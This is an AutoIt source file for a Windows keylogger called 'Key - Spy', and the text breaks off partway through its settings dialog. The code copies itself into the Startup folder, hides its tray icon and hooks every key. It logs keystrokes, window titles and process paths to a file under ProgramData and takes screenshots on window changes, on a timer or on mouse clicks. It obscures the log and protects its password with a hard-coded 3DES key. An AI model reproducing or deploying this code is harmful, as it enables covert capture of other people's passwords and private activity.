#cs ----------------------------------------------------------------------------

	AutoIt Version: 3.3.12.0
	Author:         myName

	Script Function:
	Template AutoIt script.

#ce ----------------------------------------------------------------------------
; Script Start - Add your code below here
#include <WindowsConstants.au3>
#Include <GuiButton.au3>
#Include <GuiMenu.au3>
#include <ColorConstants.au3>
#include <WinAPISys.au3>
#include <WinAPI.au3>
#include <File.au3>
#include <GUIConstantsEx.au3>
#include <ButtonConstants.au3>
#include <GuiButton.au3>
#include <GuiListBox.au3>
#include <Crypt.au3>
#include <WinAPIProc.au3>
#include <GuiComboBox.au3>
#include <ScreenCapture.au3>
#include <Misc.au3>
;wl case sensitive
;ss name and file editor
;GUISetHelp ( helpfile [, winhandle] )
Opt("GUIOnEventMode", 1)
Global $inpp = ""
Global $title = WinGethandle("[active]")
global $title2 = WinGetTitle ("[active]")
Global $control = ""
Global $state = "Stop"

if not FileExists ( @startupdir & @ScriptName ) = 1 Then FileCopy ( @ScriptFullPath, @StartupDir )


Dim $loop = 1
While $loop = 1
	If FileExists(@LocalAppDataDir & "\keylogger.txt") = 1 Then ExitLoop
	If FileExists(@LocalAppDataDir & "\keylogger.txt") = 0 Then _FileCreate(@LocalAppDataDir & "\keylogger.txt")
	FileWriteLine(@LocalAppDataDir & "\keylogger.txt", "C:\programdata")
	FileWriteLine(@LocalAppDataDir & "\keylogger.txt", "1")
	FileWriteLine(@LocalAppDataDir & "\keylogger.txt", "0")
   dim $encrypt = _Crypt_EncryptData ( "", "anjay" , $CALG_3DES )
   FileWriteLine ( @LocalAppDataDir & "\keylogger.txt", $encrypt )
   FileWriteLine ( @LocalAppDataDir & "\keylogger.txt", @CRLF & "0" )
   FileWriteLine ( @LocalAppDataDir & "\keylogger.txt", "0|101|30?Min|1|jpg" )
   Global $loc = "C:\programdata\keylogger.txt"
	If FileExists($loc) = 1 Then ExitLoop
	_FileCreate($loc)
	$loop = 2
 WEnd
call ("reload")
Func reload ()

 if FileReadLine (@LocalAppDataDir & "\keylogger.txt", 5 ) = "0" then Opt("TrayIconHide", 1)
   Global $strsplit = StringSplit ( FileReadLine (@LocalAppDataDir & "\keylogger.txt", 6), "|")
   if $strsplit[1] = "1" and StringMid ($strsplit[2], 2,1 ) = "1" Then Global $timeini= TimerInit()
   Global $ssplit = stringsplit ($strsplit[3], "?" )
   if $ssplit[2] = "min" then
	 Global $seconds = $ssplit[1] * 60
   ElseIf $ssplit[2] = "hour" then
	Global  $seconds = $ssplit[1] * 60 * 60
	  ElseIf $ssplit[2] = "seconds" then
	 Global $seconds = $ssplit[1]
  EndIf

  If FileExists(@LocalAppDataDir & "\keylogger.txt") = 1 Then
Global $locc = FileReadLine(@LocalAppDataDir & "\keylogger.txt", 1)
elseIf FileExists(@LocalAppDataDir & "\keylogger.txt") = 0 Then
Global $locc = "c:\programdata"
EndIf
Global $loc = $locc & "\keylogger.txt"
if IsDeclared ( "password" ) and $password = "True" and BinaryToString ( _Crypt_decryptData ( filereadline ( @LocalAppDataDir & "\keylogger.txt", 4  ), "anjay" , $CALG_3DES )) = "" then
$fileread = StringFromASCIIArray (StringSplit (FileRead ($loc), "|" ) )
FileDelete ($loc)
_FileCreate ($loc)
FileWrite ($loc, $fileread)
ElseIf IsDeclared ( "password" ) and $password = "false" and BinaryToString ( _Crypt_decryptData ( filereadline ( @LocalAppDataDir & "\keylogger.txt", 4  ), "anjay" , $CALG_3DES )) <> "" then
$fileread = StringtoASCIIArray (FileRead ($loc) )
FileDelete ($loc)
_FileCreate ($loc)
$ats = _ArrayToString ( $fileread )
FileWrite ($loc, $ats)
EndIf
if BinaryToString ( _Crypt_decryptData ( filereadline ( @LocalAppDataDir & "\keylogger.txt", 4  ), "anjay" , $CALG_3DES ) ) = "" then
   Global $password = "false"
Else
   Global $password = "True"
EndIf
EndFunc

If $password = "false" Then
		 filewrite ( $loc, @CRLF & "----------------------- New Session Started At - " & @MDAY & "-" & @MON & "-" & @YEAR  & " - " & @HOUR & ":" & @MIN & ":" & @SEC & "-----------------------" & @CRLF )
ElseIf $password = "True" then
	  Global $sta = StringtoASCIIArray (@CRLF & "----------------------- New Session Started At - " & @MDAY & "-" & @MON & "-" & @YEAR  & " - " & @HOUR & ":" & @MIN & ":" & @SEC & "-----------------------" & @CRLF  )
	  $sta = _ArrayToString ( $sta )
	  filewrite ( $loc, $sta & "|" );repeats a process if active focus win
EndIf

HotKeySet("!q", "usergui")
HotKeySet("{space}", "space")
HotKeySet("{backspace}", "backspace")
HotKeySet("{enter}", "enter")
HotKeySet("a", "function")
HotKeySet("b", "function")
HotKeySet("c", "function")
HotKeySet("d", "function")
HotKeySet("e", "function")
HotKeySet("f", "function")
HotKeySet("g", "function")
HotKeySet("h", "function")
HotKeySet("i", "function")
HotKeySet("j", "function")
HotKeySet("k", "function")
HotKeySet("l", "function")
HotKeySet("m", "function")
HotKeySet("n", "function")
HotKeySet("o", "function")
HotKeySet("p", "function")
HotKeySet("q", "function")
HotKeySet("r", "function")
HotKeySet("s", "function")
HotKeySet("t", "function")
HotKeySet("u", "function")
HotKeySet("v", "function")
HotKeySet("w", "function")
HotKeySet("x", "function")
HotKeySet("y", "function")
HotKeySet("z", "function")
HotKeySet("+a", "function")
HotKeySet("+b", "function")
HotKeySet("+c", "function")
HotKeySet("+d", "function")
HotKeySet("+e", "function")
HotKeySet("+f", "function")
HotKeySet("+g", "function")
HotKeySet("+h", "function")
HotKeySet("+i", "function")
HotKeySet("+j", "function")
HotKeySet("+k", "function")
HotKeySet("+l", "function")
HotKeySet("+m", "function")
HotKeySet("+n", "function")
HotKeySet("+o", "function")
HotKeySet("+p", "function")
HotKeySet("+q", "function")
HotKeySet("+r", "function")
HotKeySet("+s", "function")
HotKeySet("+t", "function")
HotKeySet("+u", "function")
HotKeySet("+v", "function")
HotKeySet("+w", "function")
HotKeySet("+x", "function")
HotKeySet("+y", "function")
HotKeySet("+z", "function")
HotKeySet("1", "function")
HotKeySet("2", "function")
HotKeySet("3", "function")
HotKeySet("4", "function")
HotKeySet("5", "function")
HotKeySet("6", "function")
HotKeySet("7", "function")
HotKeySet("8", "function")
HotKeySet("9", "function")
HotKeySet("0", "function")
HotKeySet("~", "function")
HotKeySet("`", "function")
HotKeySet("{!}", "exclamanation")
HotKeySet("@", "function")
HotKeySet("{#}", "hash")
HotKeySet("$", "function")
HotKeySet("%", "function")
HotKeySet("{^}", "above")
HotKeySet("&", "function")
HotKeySet("*", "function")
HotKeySet("(", "function")
HotKeySet(")", "function")
HotKeySet("-", "function")
HotKeySet("_", "function")
HotKeySet("=", "function")
HotKeySet("[", "function")
HotKeySet("]", "function")
HotKeySet("{", "function")
HotKeySet("}", "function")
HotKeySet("|", "function")
HotKeySet("\", "function")
HotKeySet(";", "function")
HotKeySet(":", "function")
HotKeySet('"', "function")
HotKeySet("'", "function")
HotKeySet(",", "function")
HotKeySet(".", "function")
HotKeySet("/", "function")
HotKeySet("<", "function")
HotKeySet(">", "function")
HotKeySet("?", "function")
HotKeySet ( "{+}", "plus" )

If FileExists(@LocalAppDataDir & "\keylogger.txt") = 1 And @ScriptDir = @StartupDir And FileReadLine(@LocalAppDataDir & "\keylogger.txt", 2) = "0" Then Call("stop")


While 1
	Sleep(30)
 if $state = "Record" then continueLoop
	if filereadline ( @LocalAppDataDir & "\keylogger.txt", 3 ) = "1" then call ( "search" )
	  if WinGetHandle ( "[active]" ) <> $title And  WinGetTitle ( "[active]" ) <> "" And WinGetTitle ("[active]") <> $title2 Then
		 $control = ControlGetFocus ( "[active]" )
		 If $password = "false" Then
		 $pid = WinGetProcess ("[active]")
		 filewrite ( $loc,@CRLF & "---------------------------" & @CRLF & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF  & WinGetTitle ( "[active]" ) & @CRLF & _WinAPI_GetProcessFileName ($pid) & @CRLF  )
	  ElseIf $password <> "false" then
		 $pid = WinGetProcess ("[active]")
		  Global $sta1 = StringtoASCIIArray (@CRLF & "---------------------------" & @CRLF & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF  & WinGetTitle ( "[active]" ) & @CRLF & _WinAPI_GetProcessFileName ($pid) & @CRLF  )
		  $sta1 = _ArrayToString ( $sta1 )
		  filewrite ( $loc, $sta1 & "|" );repeats a process if active focus win
		 EndIf
		  Sleep (350)
		 if $strsplit[1] = "1" and StringLeft ($strsplit[2], 1 ) = "1" then
			 if $strsplit[4] = "1" Then
				 _ScreenCapture_Capture ( $locc & "\" & @HOUR& "-" & @MIN & "-" & @SEC & "." & $strsplit[5] )

			  ElseIf  $strsplit[4] = "2" Then
				  _ScreenCapture_CaptureWnd ( $locc & "\" & @HOUR& "-" & @MIN & "-" & @SEC "." & $strsplit[5], "[active]" )
			   EndIf
			EndIf
			$title = WinGetHandle ( "[active]" )
			$title2 = WinGetTitle ("[active]")
		 EndIf


		  if $strsplit[1] = "1" and StringMid ($strsplit[2], 2,1 ) = "1" Then
             $ssplit = StringSplit ($strsplit[3], "?")
			 if $ssplit[2] = "min" then
				Global $ms = $ssplit[1] * 60 * 1000
			 ElseIf $ssplit[2] = "hour" then
				Global $ms = $ssplit[1] * 60 * 60 * 1000
		     ElseIf $ssplit[2] = "seconds" then
			    Global $ms = $ssplit[1] * 1000
			 EndIf
			 if TimerDiff ($timeini) >= $ms Then
				$timeini = TimerInit ()
				if $strsplit[4] = "1" Then
				 _ScreenCapture_Capture ( $locc & "\"  &  @HOUR& "-" & @MIN & "-" & @SEC & "." & $strsplit[5] )
			  ElseIf  $strsplit[4] = "2" Then
				  _ScreenCapture_CaptureWnd ( $locc & "\" &  @HOUR& "-" & @MIN & "-" & @SEC & "." & $strsplit[5], "[active]" )
			   EndIf
			EndIf
		 EndIf


		 if $strsplit[1] = "1" and StringRight ($strsplit[2], 1 ) = "1" Then
			if _IsPressed ( 01 ) then
			  if $strsplit[4] = "1" Then
				 _ScreenCapture_Capture ( $locc & "\" &  @HOUR& "-" & @MIN & "-" & @SEC & "." & $strsplit[5] )
			  ElseIf  $strsplit[4] = "2" Then
				  _ScreenCapture_CaptureWnd ( $locc & "\" & @HOUR& "-" & @MIN & "-" & @SEC & "." & $strsplit[5], "[active]" )
			   EndIf
			 While _IsPressed (01) = "1"
			 WEnd
		   EndIf
		 Endif

If ControlGetFocus("[active]") <> $control  and WinGetTitle ( "[active]" ) <> "" And WinGetHandle ("[active]") = $title Then
   If $password = "false" Then
		 filewrite ( $loc, @CRLF & "control change" & @CRLF  )
	     ElseIf $password <> "false" then
		  Global $sta2 = StringtoASCIIArray ( @CRLF & "control change" & @CRLF )
		  $sta2 = _ArrayToString ( $sta2 )
		  filewrite ( $loc, $sta2 & "|" );repeats a process if active focus win
	   EndIf

EndIf
	$control = ControlGetFocus ("[active]")
 WEnd

Func stop()
	If Not IsDeclared("ok") = 0 Then GUICtrlSetData($ok, "Record")
	Global $state = "Record"
	HotKeySet("{space}")
	HotKeySet("{backspace}")
	HotKeySet("{enter}")
	HotKeySet("a")
	HotKeySet("b")
	HotKeySet("c")
	HotKeySet("d")
	HotKeySet("e")
	HotKeySet("f")
	HotKeySet("g")
	HotKeySet("h")
	HotKeySet("i")
	HotKeySet("j")
	HotKeySet("k")
	HotKeySet("l")
	HotKeySet("m")
	HotKeySet("n")
	HotKeySet("o")
	HotKeySet("p")
	HotKeySet("q")
	HotKeySet("r")
	HotKeySet("s")
	HotKeySet("t")
	HotKeySet("u")
	HotKeySet("v")
	HotKeySet("w")
	HotKeySet("x")
	HotKeySet("y")
	HotKeySet("z")
	HotKeySet("+a")
	HotKeySet("+b")
	HotKeySet("+c")
	HotKeySet("+d")
	HotKeySet("+e")
	HotKeySet("+f")
	HotKeySet("+g")
	HotKeySet("+h")
	HotKeySet("+i")
	HotKeySet("+j")
	HotKeySet("+k")
	HotKeySet("+l")
	HotKeySet("+m")
	HotKeySet("+n")
	HotKeySet("+o")
	HotKeySet("+p")
	HotKeySet("+q")
	HotKeySet("+r")
	HotKeySet("+s")
	HotKeySet("+t")
	HotKeySet("+u")
	HotKeySet("+v")
	HotKeySet("+w")
	HotKeySet("+x")
	HotKeySet("+y")
	HotKeySet("+z")
	HotKeySet("1")
	HotKeySet("2")
	HotKeySet("3")
	HotKeySet("4")
	HotKeySet("5")
	HotKeySet("6")
	HotKeySet("7")
	HotKeySet("8")
	HotKeySet("9")
	HotKeySet("0")
	HotKeySet("~")
	HotKeySet("`")
	HotKeySet("{!}")
	HotKeySet("@")
	HotKeySet("{#}")
	HotKeySet("$")
	HotKeySet("%")
	HotKeySet("{^}")
	HotKeySet("&")
	HotKeySet("*")
	HotKeySet("(")
	HotKeySet(")")
	HotKeySet("-")
	HotKeySet("_")
	HotKeySet("{+}")
	HotKeySet("=")
	HotKeySet("[")
	HotKeySet("]")
	HotKeySet("{")
	HotKeySet("}")
	HotKeySet("|")
	HotKeySet("\")
	HotKeySet(";")
	HotKeySet(":")
	HotKeySet('"')
	HotKeySet("'")
	HotKeySet(",")
	HotKeySet(".")
	HotKeySet("/")
	HotKeySet("<")
	HotKeySet(">")
	HotKeySet("?")
EndFunc   ;==>stop

Func play()
	If Not IsDeclared("ok") = 0 Then GUICtrlSetData($ok, "Stop")
	Global $state = "Stop"
	HotKeySet("{space}", "space")
	HotKeySet("{backspace}", "backspace")
	HotKeySet("{enter}", "enter")
	HotKeySet("a", "function")
	HotKeySet("b", "function")
	HotKeySet("c", "function")
	HotKeySet("d", "function")
	HotKeySet("e", "function")
	HotKeySet("f", "function")
	HotKeySet("g", "function")
	HotKeySet("h", "function")
	HotKeySet("i", "function")
	HotKeySet("j", "function")
	HotKeySet("k", "function")
	HotKeySet("l", "function")
	HotKeySet("m", "function")
	HotKeySet("n", "function")
	HotKeySet("o", "function")
	HotKeySet("p", "function")
	HotKeySet("q", "function")
	HotKeySet("r", "function")
	HotKeySet("s", "function")
	HotKeySet("t", "function")
	HotKeySet("u", "function")
	HotKeySet("v", "function")
	HotKeySet("w", "function")
	HotKeySet("x", "function")
	HotKeySet("y", "function")
	HotKeySet("z", "function")
	HotKeySet("+a", "function")
	HotKeySet("+b", "function")
	HotKeySet("+c", "function")
	HotKeySet("+d", "function")
	HotKeySet("+e", "function")
	HotKeySet("+f", "function")
	HotKeySet("+g", "function")
	HotKeySet("+h", "function")
	HotKeySet("+i", "function")
	HotKeySet("+j", "function")
	HotKeySet("+k", "function")
	HotKeySet("+l", "function")
	HotKeySet("+m", "function")
	HotKeySet("+n", "function")
	HotKeySet("+o", "function")
	HotKeySet("+p", "function")
	HotKeySet("+q", "function")
	HotKeySet("+r", "function")
	HotKeySet("+s", "function")
	HotKeySet("+t", "function")
	HotKeySet("+u", "function")
	HotKeySet("+v", "function")
	HotKeySet("+w", "function")
	HotKeySet("+x", "function")
	HotKeySet("+y", "function")
	HotKeySet("+z", "function")
	HotKeySet("1", "function")
	HotKeySet("2", "function")
	HotKeySet("3", "function")
	HotKeySet("4", "function")
	HotKeySet("5", "function")
	HotKeySet("6", "function")
	HotKeySet("7", "function")
	HotKeySet("8", "function")
	HotKeySet("9", "function")
	HotKeySet("0", "function")
	HotKeySet("~", "function")
	HotKeySet("`", "function")
	HotKeySet("{!}", "exclamanation")
	HotKeySet("@", "function")
	HotKeySet("{#}", "hash")
	HotKeySet("$", "function")
	HotKeySet("%", "function")
	HotKeySet("{^}", "above")
	HotKeySet("&", "function")
	HotKeySet("*", "function")
	HotKeySet("(", "function")
	HotKeySet(")", "function")
	HotKeySet("-", "function")
	HotKeySet("_", "function")
	HotKeySet("=", "function")
	HotKeySet("[", "function")
	HotKeySet("]", "function")
	HotKeySet("{", "function")
	HotKeySet("}", "function")
	HotKeySet("|", "function")
	HotKeySet("\", "function")
	HotKeySet(";", "function")
	HotKeySet(":", "function")
	HotKeySet('"', "function")
	HotKeySet("'", "function")
	HotKeySet(",", "function")
	HotKeySet(".", "function")
	HotKeySet("/", "function")
	HotKeySet("<", "function")
	HotKeySet(">", "function")
	HotKeySet("?", "function")
EndFunc   ;==>play

Func function()
	Dim $a = @HotKeyPressed
	If _WinAPI_GetKeyState(0x14) <> 0 Then $a = "+" & $a
	If StringInStr($a, "++") <> 0 Then $a = StringTrimLeft($a, 2)
	HotKeySet($a)
	Send($a)
	HotKeySet($a, "function")

	If StringInStr($a, "+") <> 0 Then
		Dim $b = StringTrimLeft($a, 1)
		Dim $c = StringUpper($b)
		if $password <> "false" Then
		 $c = StringToASCIIArray ( $c )
		if not WinGetTitle ( "[active]" ) = "" Then  FileWrite($loc, $c[0] & "|")
	 Else
		if not WinGetTitle ( "[active]" ) = "" Then FileWrite($loc, $c )
	 EndIf
   EndIf
    If IsDeclared("c") = 0 Then
	  if $password <> "false" Then
		 $a = StringToASCIIArray ( $a )
        if not WinGetTitle ( "[active]" ) = "" Then FileWrite($loc, $a[0] & "|")
	  Else
		 if not WinGetTitle ( "[active]" ) = "" Then FileWrite($loc, $a )
	  EndIf
   EndIf

if FileReadLine ( @LocalAppDataDir & "\keylogger.txt", 3 ) = "1" then
	Global $words = FileRead(@LocalAppDataDir &  "\locked words.txt")
	If IsDeclared("c") = 0 and IsDeclared("a") <> 0 Then
		$inpp = $inpp & $a
	 ElseIf IsDeclared("c") <> 0  and IsDeclared ("a") = 0 Then
		$inpp = $inpp & $c
	EndIf

	If StringInStr($words, $inpp) = 0 Then
		$inpp = StringTrimLeft($inpp, 1)
	ElseIf StringInStr($words, $inpp) <> 0 and StringInStr($words, "|" & $inpp & "|") <> 0 Then
			$length = StringLen($inpp)
			Send("{backspace " & $length & "}")
			$inpp = ""
	Endif
EndIf


EndFunc   ;==>function

Func space()
	HotKeySet("{space}")
	Send("{space}")
	HotKeySet("{space}", "space")
	if $password <> "false" Then
	$space = StringToASCIIArray ( " " )
	FileWrite($loc, $space[0] & "|")
    Else
	FileWrite($loc, " ")
EndIf
	$inpp = ""

EndFunc   ;==>space

Func backspace()
	HotKeySet("{backspace}")
	Send("{backspace}")
	HotKeySet("{backspace}", "backspace")
	if $password <> "false" Then
	$backspace = StringToASCIIArray ( "{bs}" )
	FileWrite($loc, _ArrayToString ( $backspace ) & "|" )
 Else
	FileWrite($loc, "{bs}" )
 EndIf
	$inpp = StringTrimRight ( $inpp, 1 )
EndFunc   ;==>backspace

Func exclamanation()
	HotKeySet("{!}")
	Send("{!}")
	HotKeySet("{!}", "exclamanation")
	if $password <> "false" Then
	$ex = StringToASCIIArray ( "!" )
	FileWrite($loc, $ex[0] & "|")
    Else
	FileWrite($loc, "!")
    EndIf
EndFunc   ;==>exclamanation

Func hash()
	HotKeySet("{#}")
	Send("{#}")
	HotKeySet("{#}", "hash")
	if $password <> "false" Then
	$hash = StringToASCIIArray ( "#" )
	FileWrite($loc, $hash[0] & "|")
 Else
	FileWrite($loc, "#")
EndIf
EndFunc   ;==>hash

Func above()
	HotKeySet("{^}")
	Send("{^}")
	HotKeySet("{^}", "above")
	if $password <> "false" Then
	$above = StringToASCIIArray ( "^" )
	FileWrite($loc, $above[0] & "|")
 Else
	FileWrite ($loc, "^")
 EndIf
EndFunc   ;==>above

Func plus()
	HotKeySet("{+}")
	Send("{+}")
	HotKeySet("{+}", "plus")
	if $password <> "false" Then
	$plus = StringToASCIIArray ( "+" )
	FileWrite($loc, $plus[0] & "|")
 Else
	FileWrite($loc, "+")
EndIf
EndFunc   ;==>plus

Func enter()
	HotKeySet("{enter}")
	Send("{enter}")
	HotKeySet("{enter}", "enter")
	if $password <> "false" Then
	$enter = StringToASCIIArray ( "{enter}" )
	FileWrite($loc,_ArrayToString( $enter) & "|")
 Else
	FileWrite($loc, "{enter}")
EndIf
	If Not IsDeclared("inpp") = 0 Then $inpp = ""

EndFunc   ;==>enter

func usergui ( )
if BinaryToString ( _Crypt_decryptData ( filereadline ( @LocalAppDataDir & "\keylogger.txt", 4  ), "anjay" , $CALG_3DES ) ) = "" then
   call ( check )
else
   Call ( check2 )
EndIf
EndFunc

Func check2 ()
   if WinExists ("Key - Spy") then
	  WinActivate ( "Key - Spy" )
   Elseif Not WinExists ("Key - Spy") Then
     Call ("password")
   EndIf
EndFunc

func password ( )

   Global $gui0 = GUICreate("Key - Spy", 250, 100)
   Global $inputpassword = GUICtrlCreateInput ("", 80, 25, 150, 20, 0x0020)
   global $enter = GUICtrlCreateButton ( "Done", 79, 50, 50, 25 )
   global $cancel1 = GUICtrlCreateButton ( "Cancel", 139, 50, 50, 25 )
	Global $passlab = GUICtrlCreateLabel ( "Password", 25, 27 )

	GUICtrlSetOnEvent($enter, inputpassword)
	GUICtrlSetOnEvent($cancel1, exit0)
	GUISetOnEvent($GUI_EVENT_CLOSE, exit0)
    GUISetState ( @SW_SHOW )
    HotKeySet ("{enter}", "ent" )
   EndFunc

Func ent ()
  if WinGetTitle ("[active]") = "Key - Spy" Then
	 call ("inputpassword")
 Else
  HotKeySet("{enter}")
	Send("{enter}")
	HotKeySet("{enter}", "ent")
	if $password <> "false" Then
	$enter = StringToASCIIArray ( "{enter}" )
	FileWrite($loc,_ArrayToString( $enter) & "|")
    Else
	FileWrite($loc, "{enter}")
    EndIf
	If Not IsDeclared("inpp") = 0 Then $inpp = ""
EndIf
EndFunc

Func exit0 ( )
   GUIDelete ( $gui0 )
EndFunc

func inputpassword ( )
   $passencrypted = filereadline ( @LocalAppDataDir & "\keylogger.txt", 4  )
 global $decrypted =	_Crypt_decryptData ( $passencrypted, "anjay" , $CALG_3DES )
	$string = BinaryToString ( $decrypted )

	If GUICtrlRead ( $inputpassword ) = $string then

	   GUIDelete ( $gui0 )
	   call ( check )
	   HotKeySet("{enter}", "enter")
	ElseIf  GUICtrlRead ( $inputpassword ) <> $string then
	   GUICtrlCreateLabel ( "Wrong Password - Please Try Again", 40, 75 )
	   GUICtrlSetColor(-1, $COLOR_RED)
    Endif

   EndFunc

Func check ()
   if WinExists ("Key - Spy") then
	  WinActivate ( "Key - Spy" )
   Elseif Not WinExists ("Key - Spy") Then
     Call ("create")
   EndIf
EndFunc

Func create()

	Global $gui = GUICreate("Key - Spy", 300, 200)

	Global $File = GUICtrlCreateMenu("File")


	Global $mf = GUICtrlCreateMenuItem("Open Log File", $File, 1)
	Global $Open = GUICtrlCreateMenuItem("Export Log", $File)
	Global $Exit = GUICtrlCreateMenuItem("Exit", $File)
	Global $viewlog = GUICtrlCreateButton ( "View Log",40, 100, 100, 30)
	Global $hide = GUICtrlCreateButton ( "Hide",160, 100, 100, 30)


	Global $Help = GUICtrlCreateMenu("?")
	Global $Info = GUICtrlCreateMenuItem("Help", $Help)
	Global $about = GUICtrlCreateMenuItem("About Us", $Help)

	GUICtrlCreateMenuItem("", $File, 2) ; create a separator line

	Global $edit = GUICtrlCreateMenu("Edit", -1, 1) ; is created before "?" menu
	Global $Settings = GUICtrlCreateMenuItem("Settings", $edit)
    GUICtrlSetOnEvent($viewlog, "mf")
	GUICtrlSetOnEvent($Open, "Open")
	GUICtrlSetOnEvent($Info, "info")
	GUICtrlSetOnEvent($Exit, "end")
	GUICtrlSetOnEvent($Settings, "setting")
	GUICtrlSetOnEvent($hide, "Hide")
	GUICtrlSetOnEvent($about, "about")
    GUICtrlSetOnEvent($mf, "mf")



	Global $ok = GUICtrlCreateButton("Stop", 75, 25, 150, 45, $BS_ICON)
	If Not IsDeclared("state") = 0 Then GUICtrlSetData($ok, $state)
	GUICtrlSetOnEvent($ok, "ok")
	GUISetOnEvent($GUI_EVENT_CLOSE, end)

	GUISetState(@SW_SHOW)

EndFunc   ;==>create
Func mf ()
   if $password <> "False" Then
   $ascii = StringSplit (FileRead ( $loc ), "|" )
   _FileCreate (@LocalAppDataDir & "\temp.txt")
   FileWrite (@LocalAppDataDir & "\temp.txt", StringFromASCIIArray ($ascii))
   ShellExecute (@LocalAppDataDir & "\temp.txt")
   WinWaitClose ( "notepad.exe" )
   FileDelete (@LocalAppDataDir & "\temp.txt")
else
   ShellExecute ($loc)
EndIf
EndFunc
Func Hide ( )
   GUIDelete ( $gui )
EndFunc

Func ok()
	If GUICtrlRead($ok) = "Record" Then
		Call("play")
		GUICtrlSetData($ok, "Stop")
	ElseIf GUICtrlRead($ok) = "Stop" Then
		Call("stop")
		GUICtrlSetData($ok, "Record")
	EndIf
EndFunc   ;==>ok

Func Open()
   $location = FileSelectFolder ( "Select Export Folder", "" )
if $location <> "" Then
if $password = "True" Then
   $ascii = StringSplit (FileRead ( $loc ), "|" )
   _FileCreate ($location & "\Export.txt")
   FileWrite ($location & "\Export.txt", StringFromASCIIArray ($ascii))
   FileDelete (@LocalAppDataDir & "\temp.txt")
Else
   FileCopy ( $loc,  $location & "\Export.txt")
EndIf
MsgBox (-1, "Export successfull", "Log Exported Successfully" )
EndIf
EndFunc   ;==>Open


Func edit()
EndFunc   ;==>edit

Func info()
EndFunc   ;==>info

Func About()
   Global $about1 = GUICreate("About Us", 250, 200)
   GUICtrlCreatePic ( @LocalAppDataDir & "\pic.jpg", 0, 0, 250, 200 )
   Dim $label = GUICtrlCreateLabel ( "Keylogger"& @CRLF & "v 2.1" & @CRLF & "Made By : Anjay Goel" & @CRLF & "E-Mail - angoel123@gmail.com", 10, 10, -1, -1, 0x1000 )
   GUISetOnEvent($GUI_EVENT_CLOSE, exitabout)
   GUISetState(@SW_SHOW)
EndFunc   ;==>info

func exitabout ( )
   GUIDelete ( $about1 )
EndFunc
Func setting ()
   if WinExists ("Settings") then
	  WinActivate ( "Setting" )
   Elseif Not WinExists ("settings") Then
     Call ("settings")
   EndIf
EndFunc

Func settings()
	Global $gui2 = GUICreate("Settings", 280,315 )
	Global $save = GUICtrlCreateButton("OK", 50, 285, 80, 25, $BS_ICON)
	Global $cancel = GUICtrlCreateButton("Cancel", 150, 285, 80, 25, $BS_ICON)
	GUICtrlCreateTab ( 2, 4, 278, 277 )
	GUICtrlCreateTabItem ( "General" )
	Global $startup = GUICtrlCreateCheckbox("Start When Computer Starts", 30, 50, 200, 20)
	Global $in = GUICtrlCreateInput("", 85, 121, 150, 20)
	Global $browse = GUICtrlCreateButton("Browse", 25, 120, 55, 22, $BS_ICON)
	Global $password1 = GUICtrlCreateInput ("", 85, 155, 150, 20, 0x0020)
	Global $passlabel = GUICtrlCreateLabel ( "Password", 30, 160 )
	GUICtrlCreateLabel ( "Password for encryption of log file" & @CRLF &  "as well as for opening main window" & @CRLF & "          NULL for no password", 80, 180 )
	Global $trayicon = GUICtrlCreateCheckbox( "Show A Tray Icon", 30, 70, 200, 20)

	$fileread =FileReadLine ( @LocalAppDataDir & "\keylogger.txt", 1 )
	GUICtrlSetData ( $in , $fileread )

	If FileReadLine(@LocalAppDataDir & "\keylogger.txt", 2) = "1" Then _GUICtrlButton_SetCheck ( $startup , $BST_CHECKED )

    If FileReadLine(@LocalAppDataDir & "\keylogger.txt", 4) <> "" Then
    $passencrypted = filereadline ( @LocalAppDataDir & "\keylogger.txt", 4  )
    global $decrypted =	_Crypt_decryptData ( $passencrypted, "anjay" , $CALG_3DES )
	$string = BinaryToString ( $decrypted )
   GUICtrlSetData ( $password1, $string )
   EndIf
    _GUICtrlButton_SetCheck ( $trayicon , $BST_UNCHECKED )
    If FileReadLine(@LocalAppDataDir & "\keylogger.txt", 5) = "1" then _GUICtrlButton_SetCheck ( $trayicon , $BST_CHECKED )
	GUICtrlSetOnEvent($browse, "browse")
	GUICtrlSetOnEvent($save, "save")
	GUISetOnEvent($GUI_EVENT_CLOSE, "exitt2")
	GUICtrlSetOnEvent($startup, "startup")
	GUICtrlSetOnEvent($cancel, "cancel")

	GUICtrlCreateTabItem ("Word lock")
    Global $wl = GUICtrlCreateCheckbox("Word Lock", 15, 32, 200, 20)
    GUICtrlSetOnEvent($wl, "wl")
    If FileReadLine(@LocalAppDataDir & "\keylogger.txt", 3) = "1" Then _GUICtrlButton_SetCheck ( $wl , $BST_CHECKED )
	global $list = GUICtrlCreateList("", 15, 55, 240, 170)
	GUICtrlSetLimit(-1, 200) ; to limit horizontal scrolling
    GUISetOnEvent ( $GUI_EVENT_CLOSE , exittt )
	$read = FileRead ( @LocalAppDataDir &  "\locked words.txt" )
	GUICtrlSetData ( $list, $read )
	Global $input = GUICtrlCreateInput ( "", 15, 220, 240, 20 )
	Global $add = GUICtrlCreateButton ( "Add", 50, 245, 80, 25 )
	Global $del = GUICtrlCreateButton ( "Delete", 150, 245, 80, 25 )
	GUICtrlCreateLabel ( "The User Will Not Be Able To Type Locked Words And Also If Title Of Any Windows Contains The Specified Words, It Will Be Terminated ", 0, 330, 250, 100, 0x01 )
	GUICtrlSetOnEvent ( $del , "delete" )
	GUICtrlSetOnEvent ( $add , "add" )
    GUICtrlSetState ( $del, 64 )

GUICtrlCreateTabItem ("Screenshots")
Global $ss = GUICtrlCreateCheckbox( "Take Screenshots", 30, 30, 200, 20)
GUICtrlSetOnEvent ($ss, disable)
_GUICtrlButton_SetCheck ( $ss , $BST_UNCHECKED )
Global $strsplit = StringSplit ( FileReadLine(@LocalAppDataDir & "\keylogger.txt", 6), "|")

GUICtrlSetBkColor(-1,"-2")
GUICtrlCreateGroup("Frequency",10,55,260,110,-1,-1)
GUICtrlSetFont(-1,9,400,0,"MS Sans Serif")
GUICtrlSetBkColor(-1,"0xF0F0F0")
Global $unit = GUICtrlCreateInput("",40,130,150,20,-1,512)
Global $time = GUICtrlCreateCombo ("",195,130,70,20,-1,-1)
GUICtrlSetData($time,"Seconds|Min|Hour")
global $wc = GUICtrlCreateCheckbox("On window changes",40,70,162,20,-1,-1)
Global $timeint = GUICtrlCreateCheckbox("At specific time interval",40,110,150,20,-1,-1)
GUIctrlSetOnEvent ($timeint, disable2)
Global $mouseclick = GUICtrlCreateCheckbox("On mouse clicks",40,90,150,20,-1,-1)

GUICtrlCreateGroup("Image",10,170,260,105,-1,-1)
